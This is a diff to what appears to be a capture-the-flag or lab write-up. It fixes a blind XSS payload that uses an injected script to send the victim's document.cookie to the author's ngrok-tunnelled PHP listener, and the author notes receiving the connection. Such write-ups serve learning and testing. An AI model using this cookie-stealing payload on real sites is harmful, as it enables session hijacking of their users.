@@ -26,7 +26,7 @@ fclose($fp);
 ```
 then I made a local php server on port 80 with ```php -S localhost:80``` and I tunneled it out to receive the connection from the vulnerable site with ngrok.
 
-I crafted a blind xss payload ```<script> var i = new Image(); i.src="http://MYSITE.ngrok.io/get.php?q"+document.cookie; </script>```
+I crafted a blind xss payload ```<script> var i = new Image(); i.src="http://MYSITE.ngrok.io/get.php?q="+document.cookie; </script>```
 and I acctually recieved a connection on my server
 
 ![ngrok](https://user-images.githubusercontent.com/43896992/169716208-7b2ae392-77a7-47c1-b570-8f41fd3bb0be.png)
